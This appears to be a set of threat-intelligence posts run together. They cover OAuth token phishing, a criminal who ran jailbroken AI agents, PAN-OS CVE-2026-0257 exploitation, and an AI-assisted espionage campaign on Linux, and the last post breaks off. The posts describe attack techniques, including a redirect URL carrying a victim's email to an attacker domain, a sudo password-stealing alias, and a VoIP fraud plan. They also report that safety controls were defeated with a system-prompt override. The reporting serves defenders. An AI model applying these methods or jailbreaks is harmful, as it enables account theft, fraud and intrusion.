Title: The Current Landscape of OAuth Attacks
Context: Rather than only stealing credentials, attackers have shifted to stealing Open Authorization (OAuth) tokens, the keys that govern what applications can do on your behalf
Full Text:
As enterprises continue to roll out multi-factor authentication (MFA), attackers have adapted. Rather than only stealing credentials, attackers have shifted to stealing Open Authorization (OAuth) tokens, the keys that govern what applications can do on your behalf. Adversaries are already accelerating these attacks by using dynamic evasion code, phishing-as-a-service (PhaaS) templates and LLM-generated brand impersonations.

Because OAuth attacks occur at the authorization layer after user authentication, stolen access and refresh tokens bypass MFA, survive password resets and grant durable access.

While OAuth misuse occurs at a lower volume than traditional phishing attacks, these attacks may carry severe consequences such as:

Account takeover

Persistent access to sensitive data that survives password resets and MFA re-enrollment

Lateral movement across every service connected to the compromised identity

Data exfiltration without triggering credential-based alerts

A foothold in enterprise environments for broader supply chain or insider attacks

Defending against these threats can be accomplished using several strategies:

Disabling end-user app consent for vague or impersonating app names

Enforcing admin-only approval workflows

Monitoring authorization code clipboard events

Continuously auditing registered redirect_uri values

To understand why OAuth has become such a prime target for modern adversaries, it helps to examine the authentication challenges the protocol was originally designed to solve. Looking back at how applications handled identity before OAuth reveals how the threat landscape has evolved from simple password theft to complex token hijacking.

The Past: Phishing for Passwords

Websites and applications often tie together functionality from other sites. For example, some popular ecommerce and social media platforms allow users to log in through their email accounts.

In 2006, before OAuth, combining functionality between applications involved sharing one application’s credentials, which are supposed to be secret, with another. This type of sharing is a significant security issue because it increases the consequences of a successful credential phishing attack.

In credential phishing, attackers trick users into sharing their login credentials, allowing attackers to gain full access to their accounts. This could be access to an email account, business system, social media account or bank account. The attacker gains access to all of the information in that account and the authority to make changes, including altering the password and locking out the user.

During the pre-OAuth era, applications or sites sharing credentials meant that attackers could pivot to different platforms or services through compromising a single account.

To address these issues, the OAuth working group released the first draft of OAuth Core 1.0 in 2007. The Internet Engineering Task Force (IETF) released Request for Comments (RFC) 6749 for OAuth 2.0 in 2012 and is working on OAuth 2.1 as of 2026.

The Present: Why OAuth Became the New Attack Surface

The OAuth Framework

OAuth allows users to grant third-party applications passwordless authorization to their data on another service. Figure 1 displays a sample sign-in screen presenting OAuth authentication options with three different Identity Providers (IdPs): Google, Apple and Microsoft.

In a typical OAuth flow:

The user authenticates with the identity provider

The user approves the permissions (i.e., scopes) requested by the third-party application

The identity provider issues an access token to the third-party application

The third-party application then uses the access token to retrieve user data within the authorized scopes

This token is temporary, revocable and has scoped permissions. This gives the third-party application access to permitted resources on the user’s behalf.

OAuth Becomes the New Attack Surface

Standard phishing attacks are designed to steal login credentials like user account names and passwords. OAuth-based phishing bypasses login credential authentication entirely.

Victims authenticate through legitimate IdPs and complete MFA. They are then redirected with tokens that can grant attackers persistent, durable access.

Attackers don’t need to defeat MFA directly, because they are able to bypass it by acquiring the authorization tokens after a victim authenticates. This presents a weak spot between authentication and authorization where OAuth-based phishing can happen. If someone is the victim of a phishing campaign, their stolen tokens may give unintended permissions to an attacker’s app.

A large-scale analysis of OAuth websites found that 18.53% of these sites request permissions beyond the minimum required (typically just a user's profile and email). While not directly malicious, this statistic illustrates the likelihood of privacy and privilege leaks when excessive permissions are granted.

The Core Vulnerability: Tokens Outlive Passwords

One of the primary advantages of OAuth is that tokens, unlike passwords, are designed to be short-lived and easily revoked. However, in practice, OAuth tokens:

Are frequently configured to be long-lived

Survive a password reset since the token is not a password

Bypass MFA since the victim already completed MFA during the flow

Provide persistent access (until explicitly revoked) since refresh tokens silently mint new access tokens for days or months after the initial compromise

This persistence directly amplifies the following authorization vulnerabilities:

Cross-User OAuth Session Fixation (COSF)

Cross-Tenant Client ID Confusion

Cross-Connector OAuth Account Takeover

COSF allows an attacker to use a long-lived token as a permanent backdoor. This type of vulnerability arises when an OAuth session is used to complete an authentication flow without verifying its strict binding to the initiating user’s identity.

The attacker initiates an OAuth process (e.g., “Connect your Slack”) inside a target app

Before completing the OAuth process, the attacker freezes the session and sends the victim a phishing link

The victim logs into their real Slack account, but through the attacker's fixated session

The resulting access token lands in the attacker's account

The next two vulnerabilities rely on OAuth-as-a-service (OaaS). OaaS lets organizations outsource token management to a centralized cloud provider where the provider creates a single token vault and manages tokens for hundreds of different apps (tenants). These are commonly used by organizations with many applications. OaaS architecture is inherently susceptible to Cross-Tenant Client ID Confusion and Cross-Connector OAuth Account Takeover.

Cross-Tenant Client ID Confusion

In Cross-Tenant Client ID Confusion, a malicious app (Tenant A) swaps its app identifier (Client ID) to impersonate a trusted app (Tenant B) sharing the same vault. The vault trusts both tenants, processes the request under the trusted app's context and accidentally exposes access to the malicious tenant.

Cross-Connector OAuth Account Takeover

In Cross-Connector OAuth Account Takeover, a malicious tenant manipulates how the vault maps OAuth sessions to connectors. A victim's authorization flow, meant for a different app entirely, gets rerouted into the attacker's control. As a result, attackers take over the full account without stealing credentials

Both attacks get easier the longer a token stays valid. A short-lived token limits the damage window.

Existing Mitigations

OAuth security is decentralized and dictated by the IdP. While major IdPs have robust defenses against flow misuse, many smaller platforms offer weak protections.

The root challenge is the lack of a global registry for Client IDs. Without a universal ground truth of identity, attackers can easily impersonate legitimate app names on lax platforms. To counter this, leading IdPs enforce strict guardrails. Google, for example, mitigates misuse through:

Domain ownership verification for redirect URIs

Unverified app warnings to deter users from unauthorized integrations

Strict security audits for apps requesting sensitive scopes

Because you cannot rely on every IdP to protect your data equally, a third-party consent security policy is essential. A centralized, automated policy enables organizations to standardize their defenses by:

Enforcing least-privilege

Blocking unverified apps

Revoking risky grants uniformly, regardless of the individual provider's security gaps

OAuth-Based Phishing Campaigns

Currently, OAuth-based phishing campaigns fall into three categories, each defined by what the attacker is trying to achieve:

Account hijacking: The attacker obtains a durable token granting them the same access as the victim (full identity assumption)

Permission hijacking: The victim is tricked into consenting to a malicious app, giving the attacker scoped access to specific resources

Malicious redirect: The attacker uses the OAuth flow's redirect mechanism to deliver malware or phishing, exploiting the trust users place in flows that originate from real identity provider domains

Account Hijacking: Stealing the Identity Itself

Account hijacking is the most complete form of identity compromise. The attacker ends up with an OAuth access or refresh token that authenticates them as the victim on every downstream service that trusts that identity provider. Attackers misuse two distinct OAuth flows to achieve account hijacking: the device authorization flow and the authorization code flow.

Device Authorization (DeviceAuth) Misuse

How the Legitimate Flow Works

The device authorization grant was designed for devices that cannot open a browser such as smart TVs, gaming consoles and command-line tools. The device displays a short code and a URL (like microsoft[.]com/devicelogin). The user opens that URL on a separate device, enters the code, signs in and the original device receives an access token.

How Attackers Exploit It

Instead of a legitimate device requesting the code, the attacker's server requests it. The attacker then shows that code to the victim and instructs them to paste it into, for example, Microsoft's real device login page. When the victim signs in and submits the code, they are unknowingly authenticating the attacker's session.

Authorization Code Theft via Benign Apps

How the Legitimate Flow Works

In the standard authorization code flow, a user authenticates with an identity provider, which issues a short-lived authorization code and redirects the browser to a registered redirect_uri. The application then exchanges that code for an access token in a server-to-server call the user never sees.

How Attackers Exploit It

Attackers use a legitimate application's redirect_uri to expose the authorization code in the browser, then use social engineering to extract it. No malicious app registration is needed; the attack rides on apps that already pass every security check.

Permission Hijacking: Tricking Users into Granting Access

Permission hijacking is more of a surgical attack than a full account takeover. Rather than stealing a code or device token, the attacker's goal is to have the victim click Allow on an OAuth consent screen that grants an attacker-registered application persistent, scoped access to specific resources. The victim authenticates legitimately and completes MFA. They simply consent to the wrong application.

The consent screen is the attack surface. Victims reach it through two attack strategies: vague app names or brand impersonation.

Vague App Names

In this strategy, the attacker registers an application with an innocuous-sounding name (e.g., Privacy Policy Extension or Security App) that provides no meaningful signal about its intent. It then requests permissions far beyond what the name implies.

Brand Impersonation

In this strategy, the attacker registers an application that displays as a trusted brand while the underlying client_id belongs to an attacker-controlled application. The consent screen shows the name provided at registration rather than any verified identity. As such, the victim sees a familiar brand name from a legitimate identity provider, with no visible signal that the application is fraudulent.

Malicious Redirect: Weaponizing the OAuth Flow for Delivery

In malicious redirect attacks, the attacker's goal is not account access or a scoped token. Instead, they weaponize the OAuth authorization flow itself as a delivery mechanism, exploiting the trust users place in pages and redirects that originate from real identity provider domains.

Attackers have used different tactics to weaponize the OAuth flow, such as:

Impersonating trusted services

Triggering OAuth errors

Leveraging less safe IdPs

Impersonating Trusted Services

Attackers register OAuth applications that impersonate trusted services and configure attacker-owned domains as the redirect_uri. When the victim completes the OAuth flow on the real identity provider, the browser is redirected to the attacker's domain as part of the normal protocol. Because the user just interacted with a legitimate identity provider and expects to land somewhere, the redirect is implicitly trusted.

Triggering OAuth Errors

Documented by Microsoft in March 2026, a more covert campaign exploits how identity providers handle errors to redirect users to attacker-controlled malicious landing pages. Attackers crafted authorization URLs designed to deliberately trigger an authentication error. For example, they combined prompt=none with parameters that required user interaction, creating an irresolvable conflict.

When the identity provider cannot complete the authorization, it does not show an error page. Instead, it appends error parameters to the redirect_uri and sends the browser there automatically. An example of a redirect URL format after triggering an error is as follows:

<attacker-domain>/security/?state=<encoded-victim-email>&error=interaction_required&error_subtype=access_denied

Since the crafted link points to a trusted OAuth provider, the user is more likely to click it and be exposed to the malicious content with just that one click.

Leveraging Less Safe IdPs

Attackers weaponize lax validation on less secure IdPs to execute redirection attacks. For example:

If an IdP fails to validate the presence of a client_id, attackers can weaponize the authorization server as a generic open redirector without even creating a malicious OAuth app

If an IdP has a permissive redirect_uri validation, attackers may leverage path traversal or URL parameters to redirect to their own malicious domains

The Escalation: Shift From Basic to Sophisticated Methods

Credential phishing generally relies on mass-delivered, low-fidelity landing pages designed to capture plaintext passwords. Today, attackers have evolved from only harvesting static secrets to hijacking active, authenticated sessions. By positioning themselves inside legitimate OAuth protocols, campaigns can bypass perimeter controls, turning the trust mechanisms of single sign-on (SSO) and federation into vectors for compromise.

From Static Pages to Dynamic Evasion

Security architectures have in the past heavily relied on static analysis and domain reputation to block malicious links. In response, threat groups shifted from static HTML templates to dynamic, highly evasive client-side execution environments.

Key characteristics of this shift include:

Runtime decryption: As observed in recent campaigns, threat actors deliver payloads as obfuscated blobs (using encryption algorithms such as AES-GCM) via edge infrastructure like Cloudflare Workers. The payloads assemble the interface only after execution in the victim's browser. Figure 2 below shows a code snippet from an example of a phishing page.

Active environment fingerprinting: Phishing pages now query the browser environment, implementing heuristics to detect developer tools, automated sandbox configurations or headless security crawlers.

Defensive evasion loops: When the payload detects a monitoring tool or security analyst is detected, the page shifts its behavior, invoking endless debugger loops or silently routing traffic to legitimate domains to preserve the longevity of the infrastructure. Figure 3 shows an example of code used for this type of monitoring.

The PhaaS Economy

The effectiveness of these campaigns is amplified by the commercialization of specialized threat kits within the cybercriminal underground. We observed that the attackers use the same template to generate OAuth phishing pages impersonating different brands. We show examples of different brand impersonations in Figure 4.

This PhaaS ecosystem has two key characteristics:

Modular templates: PhaaS platforms now offer plug-and-play OAuth components. A single underlying framework can be dynamically re-skinned with different corporate assets. We have observed attackers impersonating multiple popular document sharing platforms as part of campaigns.

Shared infrastructure: Multiple seemingly distinct campaigns share identical tokens. We have observed identical data used for anti-bot tokens (example in Figure 5) and Cloudflare Real User Monitoring (RUM) tokens. This indicates that specialized developers are renting highly capable infrastructure to a broader array of less technical affiliates.

LLMs as an Attack Accelerator

Generative AI has lowered the barrier of entry for executing high-fidelity, targeted identity operations. We have observed signs of websites generated with the help of LLMs, such as the example below in Figure 6. The code in these phishing pages suggests that attackers are using LLMs to impersonate legitimate pages and rapidly deploy attacks.

The operational advantages provided by LLMs include:

High-fidelity brand impersonation: Attackers leverage LLMs to overcome typical signs of impersonation, such as poor syntax, unnatural phrasing or layout inconsistencies. Generative models enable adversaries to rapidly produce context-specific localization, creating more convincing brand imitations that can mislead users.

Rapid deployment cycles: Rather than relying solely on static templates or manual development, threat actors can leverage LLMs to generate functional landing page code tailored to specific target organizations. This allows attackers to build targeted, localized campaigns and test and deploy attacks at a velocity that reactive defense layers struggle to match.

Expanding OAuth Ecosystem

OAuth adoption continues to grow beyond identity providers into infrastructure platforms, and every new platform that joins the ecosystem adds a new consent surface for attackers to exploit. A notable recent example is Cloudflare's June 2026 launch of self-managed OAuth clients, which now allows third-party developers to build applications that act on behalf of users to access their Cloudflare accounts.

Cloudflare accounts control critical infrastructure such as DNS, CDN routing and edge compute. This means a token granted through a malicious OAuth app carries a far greater impact radius than one granting access to email or files. An attacker who tricks a developer into consenting could gain the ability to deploy malicious pages, redirect legitimate traffic or build phishing infrastructure on domains that most enterprise security tools inherently trust.

How to Defend Against OAuth Attacks

Standard perimeter and client-side security controls fail against OAuth phishing attacks, particularly for the following reasons:

Access tokens survive a password reset

The attack bypasses MFA because the victim has already completed MFA during the legitimate flow

Conditional Access and IP firewalls fail because OAuth grants access to any token presenter, regardless of origin

Unlike a typical login where a server might establish a persistent, multi-factor session bound to a specific user's browser, the server validates the token's cryptographic signature. However, the session lacks an inherent link to the user's initial authorization context. Additionally, because flows like device authorization intentionally decouple the initiating and authenticating devices, enforcing strict IP or device consistency checks would break the protocol's design.

Effective defenses must focus on account hijacking, permission hijacking and malicious redirects.

Defenses for Account Hijacking

Attackers rely on manipulating victims into pasting sensitive codes into legitimate portals such as device login pages or messaging applications. Security tools can monitor for clipboard copy and paste events along with the source and target of these events. For example, if code is copied from an untrusted source, the tool can flag this anomaly and alert the user before token generation occurs.

Defenses for Permission Hijacking

Organizations can combat consent phishing through strict name-checking and mandatory user consent rerouting. Security posture management tools must enforce policies that automatically block consent requests from apps with vague or impersonating names. Ultimately, enterprises should disable end-user consent for third-party integrations entirely, routing all requests through an admin consent workflow where security teams can review and prune excessive scopes before authorization.

Defenses for Malicious Redirects

To prevent attackers from weaponizing OAuth callback URLs to deliver malware or steal credentials, organizations must mandate redirect destination audits. This requires a continuous, automated inventory of all registered applications to ensure every configured redirect_uri points to verified domains. Any app attempting to register an external, recently created or unmanaged domain as a callback target must be automatically quarantined to neutralize redirect exploitation.

User awareness is the final line of defense against social engineering. Employees must treat OAuth consent screens with the same scrutiny as password fields. They should not grant permissions to apps with vague names or excessive scopes and avoid copy-paste authorization or device codes into unverified chat applications.

Conclusion

OAuth-based phishing represents a fundamental shift in our threat landscape. Attackers no longer need to steal credentials when they can harvest tokens that bypass MFA entirely and persist through password resets.

Defending against this threat requires visibility where the attack happens:

In the browser

At the moment of authorization

Before a token is ever issued

Organizations that wait for credential-based alerts or rely solely on post-authentication controls will find themselves unable to see these attacks. In our next blog, we’ll discuss how OAuth attacks are expected to evolve, especially with AI agents.

Context: Our visibility into this specific actor's operational environment gives us unique insights into exactly how threat actors are building, testing and executing agentic attacks...
Full Text:
Executive Summary

“Can you find about like what scam or thing they done in past like spoofing calls or somthing [sic],” the threat actor typed. The conversation was with one of several AI assistants that the actor was using to get advice on planning and executing a variety of cybercrime activities.

Our visibility into this specific actor's operational environment gives us unique insights into exactly how threat actors are building, testing and executing agentic attacks across multiple campaign types.

Unit 42’s investigation into the actor’s operational environment and activities makes two things clear:

The attacker used basic tooling and relied on AI-generated scripts and reconnaissance reports, suggesting they didn’t have the skills these activities would have required before the advent of readily available AI tools.

Despite some apparent bumbling, the actor had an impact, attacking a number of targets in India, including universities. The actor recovered thousands of records revealing personal information and mapped multiple organizations’ attack surfaces.

The attacker’s conversations with jailbroken AI tools included getting step by step advice on how to set up a fraudulent Voice over IP (VoIP) operation. One assistant “helpfully” generated a document including a “NEXT EXPLOIT OPPORTUNITIES” section, outlining planned followup attacks.

Unit 42 identified and investigated this threat actor's operational environment. There, we determined that they had weaponized an AI assistant across several types of cybercrime, including:

Credential theft and data exfiltration

VoIP telecommunications fraud

Wi-Fi password cracking

Cryptocurrency reconnaissance

Command-and-control (C2) operations

An actor operating under the handle BUGSTER configured the Hermes Agent framework with DeepSeek V4 as its reasoning engine and Cursor integrated development environment (IDE) as a secondary tool, both with safety controls disabled. The actor ran an AI-generated brute-force campaign against an Indian university’s website. The actor also achieved a confirmed intrusion against a second university, where they exfiltrated a database of more than 5,200 records, including personally identifiable information (PII) on students.

The actor also built specialized AI bot profiles to acquire VoIP fraud expertise through conversation and maintained automated pipelines for Wi-Fi password cracking and cryptocurrency whale reconnaissance (i.e., identifying large cryptocurrency holders). Notably, the Wi-Fi cracking capability requires close physical proximity to the target, indicating the actor had local access to the targeted locations.

Multiple, unrelated actors are independently adopting the same Hermes + DeepSeek combination. This suggests we may be witnessing an increasingly prevalent toolchain of choice for cybercriminals adopting AI-enabled capabilities. We assess a key driver is low safety friction at low cost: DeepSeek models are inexpensive and easy to access, and readily jailbroken with a simple system-prompt override.

Technical Analysis

We identified evidence that the threat actor leveraged AI systems for a wide range of criminal activity against multiple target networks, primarily in India. The criminal activity included:

Planning for VoIP fraud

Credential theft targeting several organizations

Wi-Fi password cracking

Cryptocurrency reconnaissance

C2 payloads

Credential Theft and Data Exfiltration

WordPress Brute Force

The actor used AI-generated reconnaissance to conduct a methodical attack against an Indian university's online education platform. The actor’s enumeration reports exhibit structured formatting (executive summaries, severity ratings, systematic endpoint categorization) consistent with AI-generated output. The attack progressed through four stages:

Subdomain enumeration: The actor identified 12 subdomains including the main WordPress site, a learning management system (LMS), student portal and administration dashboard

WordPress REST API enumeration: The actor extracted 13 active user IDs with real names via post author fields and author sitemaps, bypassing the Cloudflare Web Application Firewall (WAF) that blocked direct user endpoint access

Targeted brute force: A generator script produced a brute force tool with 117 usernames (derived from the enumeration) and 28 common passwords

Credential brute force: The actor’s tool flagged one WordPress login as valid

Figure 2 shows output from a brute force attempt that recorded a candidate credential (stage 4).

University Database Exfiltration

The actor exfiltrated a MongoDB database from a second Indian public university. The exfiltration tooling wrote a manifest alongside the dumped collections, recording the following data:

Admin credential obtained: An administrator account with a weak password

Exfiltrated records: Thousands of student records (diploma, undergraduate, postgraduate) and faculty records containing PII

Infrastructure exposed: Cloud load balancing, edge routing, database services, and a third-party cloud storage service account

E-Commerce Enumeration

The actor enumerated an Indian site on a popular e-commerce platform, extracting:

A storefront API token

Three admin email addresses

Two phone numbers

Payment merchant IDs

The attack report is a suspected large language model (LLM)-generated document, including a NEXT EXPLOIT OPPORTUNITIES section outlining planned follow-up attacks.

VoIP Telecommunications Fraud

We also identified evidence that the actor was developing VoIP (Voice over IP) fraud infrastructure, using the alice Hermes profile as an AI-powered advisor. Evidence included:

Advisory conversations

A detailed technical knowledge base

Carrier research

However, the absence of call logs, Session Initiation Protocol (SIP) traces or active call routing suggested the operation was still in a planning or early setup phase.

With DeepSeek V4 as the underlying model, alice provided detailed, actionable criminal methodology through conversations and a comprehensive fraud knowledge base ingested into the bot. The actor developed a planned approach following an established VoIP fraud model:

Establish a legitimate front: Register a US limited liability company (LLC) with an employer identification number (EIN) to qualify as a telecommunications provider. The knowledge base includes detailed guidance on:

Forming LLCs in Wyoming or Delaware as a non-US resident

Obtaining an EIN without a Social Security number via the US Internal Revenue Service (IRS) fax

Completing Federal Communications Commission (FCC) registration

Obtain carrier access: Contract with legitimate VoIP carriers to purchase call routing capacity (SIP trunks).

Traffic mixing: Route approximately 70% legitimate call traffic alongside 30% fraudulent calls to stay below carrier compliance audit thresholds.

Bypass caller ID authentication: Circumvent STIR/SHAKEN, the FCC-mandated caller identity verification framework. In the advisory conversations, alice covers bypass techniques and Calling Line Identification (CLI) spoofing.

Monetize: Generate revenue with the 30% fraudulent traffic through toll fraud and other non-compliant routes. Least-cost routing (LCR) optimizes per-minute costs across carrier tiers.

The pandarouter profile handled carrier research. The excerpt below in Figure 4 illustrates how the actor used it to investigate a wholesale VoIP carrier for regulatory vulnerabilities and past fraud.

Other Operations

Command and Control

The threat actor’s infrastructure maintained a listening port for a Python-based C2 listener supporting Windows reverse shell connections. Supporting payloads include:

A Base64-encoded PowerShell reverse shell delivered via VBScript

A QubesOS VM setup script with SSH and ncat

Multiple Windows shell variants

Wi-Fi Password Cracking

The actor developed an automated Wi-Fi password cracking process. A Linux (Kali) device the actor labeled Pi placed within range of target Wi-Fi networks captured Wi-Fi Protected Access (WPA) authentication material (PMKID or EAPOL handshakes) from nearby access points.

The server collected these hashes over an SSH tunnel and dispatched them to Vast.ai cloud GPU instances for cracking, with results automatically reported back to the actor via Discord webhooks. This technique requires physical proximity to the target networks, indicating the actor had local access to the targeted locations.

Credential Scanning Toolkit

We also identified a large Go-based credential-scanning toolkit. This toolkit scrapes webpages and extracts exposed credentials, including:

.env values

S3 signed URLs

Google Cloud service account keys

Content delivery network (CDN) API keys

Private keys in log files

A companion Python script scrapes domain lists for scanning.

Cryptocurrency Reconnaissance

The actor scraped the top 500 ETH holders and major token holders via the DeBank API, producing intelligence files that documented 45 cryptocurrency whales with net worth figures. We assess this was likely for future targeting, but we were unable to identify any follow-on activity during this research.

Tool Design and Infrastructure

The threat actor used a single US-based server (162.243.3[.]92) to host multiple core services, including:

The Hermes Agent framework

A C2 listener

A Cursor integrated development environment (IDE) proxy

Several supporting components

Our analysis of the actor’s logs and test scripts indicates that they experimented with various LLMs, including GLM 5.2 by Zhipu AI and other models accessed through OpenRouter. Ultimately, they chose DeepSeek V4 as the backend for operations.

The actor's test scripts show repeated attempts to defeat model safety controls with a prompt-level override. Although GLM 5.2 is an open-weight model that has been reported as weakly guarded, the actor built a dedicated script to send the override to GLM 5.2 and flag refusals. This case illustrates how AI lowers the skill barrier for cybercrime. The actor used basic tooling and relied on AI-generated scripts and reconnaissance reports, but still achieved notable impact. They recovered more than 5,200 PII records and mapped multiple organizations' attack surfaces. AI enabled a single actor to operate across diverse attack types (credential theft, VoIP fraud, Wi-Fi cracking, cryptocurrency targeting) that would traditionally require distinct skill sets.

The VoIP fraud planning demonstrates a particularly notable use of AI as a domain expert. With DeepSeek V4 as the underlying model, the actor's bot profiles provided detailed, actionable criminal guidance.

Executive Summary

October 19 Update

Unit 42 has observed attempted exploitation of the May 2026 CVE-2026-0257 by ransomware operators, including Spikey Scorpius (aka Qilin) and Tarnished Scorpius (aka Inc).

We’re also aware of public reporting attributing exploitation to threat actors using Settra ransomware.

Fixes for this vulnerability have been available since May 2026. Palo Alto Networks has become aware of limited exploit attempts on unpatched PAN-OS devices without mitigations applied.

Customers can mitigate the risk of this issue by taking any of the following actions:

Use a dedicated certificate for Authentication Override cookies: Generate a new certificate exclusively for authentication override cookies and store it securely. Do not reuse the portal or gateway certificate, and do not share this certificate with other features or users.

Disable Authentication Override: Uncheck the Authentication Override options (for generating and accepting cookies) in the GlobalProtect portal and gateway configuration.

June 5, 2026

In June 2026, Palo Alto Networks Unit 42 observed active exploitation of the May 2026 PAN-OS vulnerability CVE-2026-0257 by an unidentified threat actor attempting to access GlobalProtect. This security flaw involves an authentication bypass in the portal and gateway components of vulnerable versions of PAN-OS® software, which could allow unauthorized attackers to circumvent security controls and initiate virtual private network (VPN) connections.

This CVE was added to the Known Exploited Vulnerability (KEV) catalog on May 13, 2026.

No post-access behavior or lateral movement was identified. Only a small portion of the probed devices actually established VPN sessions, resulting in gateway-connected events.

We advise organizations to proactively hunt for the indicators of the activity specified in this report and activate incident response protocols for any successful gateway-connected events linked to these indicators. Additionally, we strongly recommend reviewing the security advisory for CVE-2026-0257, following the available workarounds and mitigations or upgrading to a version that includes a fix for this issue.

Management Interface Exposure Risk and Remediation

During incident response (IR) engagements associated with the Lunar Peak campaign, Unit 42 observed a recurring misconfiguration that led to critical, unintended exposure. Specifically, organizations frequently mapped GlobalProtect (GP) profiles to HTTP/HTTPS services on their management interfaces.

This configuration inadvertently exposes the management interface to the internet on specific ports, most notably 4443 and 3879, often without administrators' knowledge. While the risks of this exposure were previously documented, the frequency of this oversight during the Lunar Peak incidents prompted a comprehensive update to our official guidance to ensure maximum clarity.

Verification and mitigation:

Verify exposure: Defenders can rapidly verify whether their environments are affected by attempting an out-of-band HTTPS connection to their management IP address on ports 4443 and 3879 via an external web browser.

Remediate: To remediate this issue and enforce the principle of least privilege, we strongly advise administrators to review official Palo Alto Networks documentation on configuring Interface Management profiles to safely restrict access.

Update: Oct. 19, 2026

Ransomware operators exploiting the May 2026 CVE-2026-0257 include Spikey Scorpius (aka Qilin) and Tarnished Scorpius (aka Inc). Public reporting attributes exploitation to threat actors using Settra ransomware.

Attackers are leveraging this vulnerability to gain an initial foothold into corporate networks, subsequently bypassing multi-factor authentication (MFA) controls to establish a VPN session. Following this, the threat actors are typically:

Conducting internal network reconnaissance using dual-use remote monitoring and management (RMM) tools

Moving laterally via RDP and SMB

Staging additional tooling for credential harvesting, data exfiltration and ultimately, ransomware deployment

Our investigations have continued since early June 2026, and have spanned across numerous industries, including:

High technology

Hospitality

Manufacturing

Professional and legal services

Government

Utilities and energy

Wholesale and retail

The most significant evolution in tactics, techniques and procedures (TTPs) following successful exploitation of CVE-2026-0257 is the direct pivot to the virtualization layer. In one notable case, attackers moved from the compromised VPN gateway to the vCenter management appliance. From there, they disabled security controls on ESXi hypervisors (execInstalledOnly) and used a custom tool to perform offline credential dumping directly against a domain controller's virtual disk (VMDK).

This tactic bypasses in-guest endpoint detection and response (EDR) and security controls, representing a highly sophisticated method for obtaining domain-wide credentials. We have also observed actors chaining this initial access with other exploit tools, such as those targeting Veeam backup infrastructure (CVE-2023-27532), to maximize their impact.

Title: AI-Powered Espionage Campaign Targets Government Linux Infrastructure
Context: SysGoRAT Malware The attackers deployed a custom-developed, multi-platform remote access Trojan (RAT) written in Go, first observed under the benign file name sys-control-client
Full Text:
Executive Summary

Unit 42 identified a campaign targeting government entities and state-affiliated infrastructure, with observed activity spanning from October 2025–April 2026. We track this activity as CL-UNK-1211.

In the operations we witnessed, the attackers relied on AI-generated payloads. Multiple artifacts deployed throughout the intrusion contained AI-made conversational annotations and developer reasoning comments, suggesting that the code was either generated using large language models (LLMs) or executed by an automated AI agent.

The attackers behind this cluster of activity focused on Linux environments to conduct extensive reconnaissance and maintain persistent network access to support intelligence-gathering. The attackers attempted to dump sensitive databases and exfiltrate government mailboxes to access social media accounts.

The campaign included a diverse toolkit that combined open-source tools, custom cross-platform backdoors and widespread web shell deployments. We observed various defense evasion techniques, including attempts to disable endpoint protections, erase system logs and plant deceptive red-team markers to disguise activity as a legitimate security assessment.

Our attribution of this activity to CL-UNK-1211 is in accordance with the Unit 42 attribution framework. We designate the term UNK to clusters of activity whose affiliation with either nation-state or cybercrime activity we have not yet determined.

This investigation uncovers the defining tools, techniques and attack patterns of this activity cluster.

Palo Alto Networks customers are better protected from the threats discussed above through the following products and services:

Advanced WildFire

Advanced URL Filtering, Advanced DNS Security and Advanced IP Defense

Cortex XDR Analytics Engine

Cortex XDR and XSIAM

Cortex Cloud

The Unit 42 AI Security Assessment and Unit 42 Frontier AI Defense service can help identify and mitigate complex AI-enabled risks.

If you think you might have been compromised or have an urgent matter, contact the Unit 42 Incident Response team.

Related Unit 42 Topics

AI, Credential Harvesting, Linux

Technical Analysis Overview

Our analysis of the CL-UNK-1211 cluster of activity reveals a versatile operational playbook tailored to enterprise Linux and database environments. The attackers targeted government entities and state-affiliated infrastructure, maintaining persistent access by using a combination of custom cross-platform backdoors, open-source utilities and widespread web shell deployments.

The attackers enumerated mailboxes to identify and gain access to social media accounts tied to government email addresses. In addition, they dumped entire database contents before attempting to exfiltrate the data.

The attackers behind CL-UNK-1211 exhibited a methodical approach to defense evasion. This included attempting to disable endpoint protections on compromised systems, and to tamper with system logs that might contain evidence of the attack.

We provide a comprehensive analysis of the defining tools, techniques and procedures (TTPs) used throughout the operation, highlighting how the attackers leveraged AI to streamline payload creation across their execution workflow. Our analysis details key mechanisms across the attack chain. These include:

Initial access via web shell deployment and credential harvesting

Custom RAT execution

Mailbox targeting

Anti-forensics measures

Using AI to Streamline Payload Creation

Throughout the operation, the attackers relied on malicious PHP and shell scripts to maintain persistence, perform reconnaissance and exfiltrate data. These payloads revealed structural patterns and artifacts consistent with AI-assisted code generation.

Rather than standard developer documentation, multiple scripts contained conversational, step-by-step reasoning notes. These notes explained the code’s logic to the operator who provided the initial instructions. Their presence suggests that the code was either copied directly from an AI prompt output or deployed by an automated AI agent.

In addition, we identified several common characteristics that are consistent with AI-operated attacks, such as:

Section headers in scripts and shell commands, which AI uses to analyze the output faster

Extensive use of Base64-encoded commands

Seamless switching between different technologies throughout the attack, including PHP, JavaScript, Bash and Python

Figure 1 shows snippets of code from scripts used by the attackers that contained AI-generated comments.

Dropping Multiple Web Shells for Initial Access

To gain access and maintain a persistent backdoor into the host networks, the attackers deployed a variety of web shells on the targeted Linux servers. These were a combination of custom and open-source web shells found on GitHub. Figure 2 shows interactive web shell activity from the php-fpm parent process.

To achieve persistence, the attackers modified the auto_prepend_file value across all PHP configurations under the directories /etc/php/ and /opt/plesk/php/. These directories store all default PHP configuration files and Plesk (web hosting control panel) configuration files. Any file that is specified in the modified auto_prepend_file value will automatically load and execute before any other PHP script runs.

In one instance, the attackers deployed a malicious PHP web shell as a file named /usr/lib/php/plesk_sys_driver.php to appear legitimate. They also modified the auto_prepend_file to load the malicious web shell to ensure persistence. Figure 3 shows the attacker-deployed PHP script, including the original inline comments.

Credential Harvesting Techniques

The attackers used multiple methods to gather credentials in the targeted environments, including:

Editing the .bashrc file

Inserting malicious lines of code into PHP scripts

Scanning the network for cleartext passwords

Hijacked .bashrc File

The attackers replaced the .bashrc file with a copy containing a malicious command that steals victims’ passwords. In one instance, they created an alias for the sudo command that was designed to execute each time a user attempted to run it. The malicious command:

Displays a prompt for the user to insert their password (mimicking the standard system authentication prompt)

Captures the inserted password

Writes it to the attackers’ log file

The harvested password is then passed to the legitimate sudo command for execution, leaving the victim unaware of the underlying interception. The attackers named the log file Solarwinds.StatusLog.txt, to mimic legitimate SolarWinds activity in the environment. We have no evidence of SolarWinds systems and infrastructure being compromised during this operation; the attackers misused the organization’s name as an evasion method.

Figure 4 shows the command hijacking technique inside the .bashrc file.

PHP Credential Logger

